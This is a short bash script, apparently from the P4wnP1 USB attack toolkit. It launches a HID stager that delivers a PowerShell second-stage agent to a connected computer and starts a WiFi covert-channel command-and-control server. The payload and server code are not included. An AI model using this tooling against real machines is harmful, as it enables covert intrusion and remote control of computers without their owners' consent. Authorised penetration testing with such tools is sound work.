#!/bin/bash

# use CLI client to determine raw HID device
hidraw=$(P4wnP1_cli usb get device raw)

# exit if HID raw device isn't up
if [ "$hidraw" = "" ]; then
	echo "no raw HID device found, aborting"; 
	exit
fi

echo "Kill old hidstager processes ..."
ps -aux | grep hidstager.py | grep -v grep | awk {'system("kill "$2)'}

echo "Starting HID stager for WiFi covert channel payload"

# start HID covert channel stager (delivers PowerShell stage2 via raw HID device)
# the '-s' parameter terminates the stager after every successfull stage2 delivery
/usr/local/P4wnP1/legacy/hidstager.py -s -i /usr/local/P4wnP1/legacy/wifi_agent.ps1 -o $hidraw &

if ! ps -aux | grep wifi_server | grep -q -v grep; then
	echo "Start WiFi covert channel server and attach to screen session..."
	# start WiFi covert channel server
	screen -dmS wifi_c2 bash -c "/usr/local/P4wnP1/legacy/wifi_server.py"
else
	echo "HID covert channel server already running"
fi


P4wnP1_cli led -b 3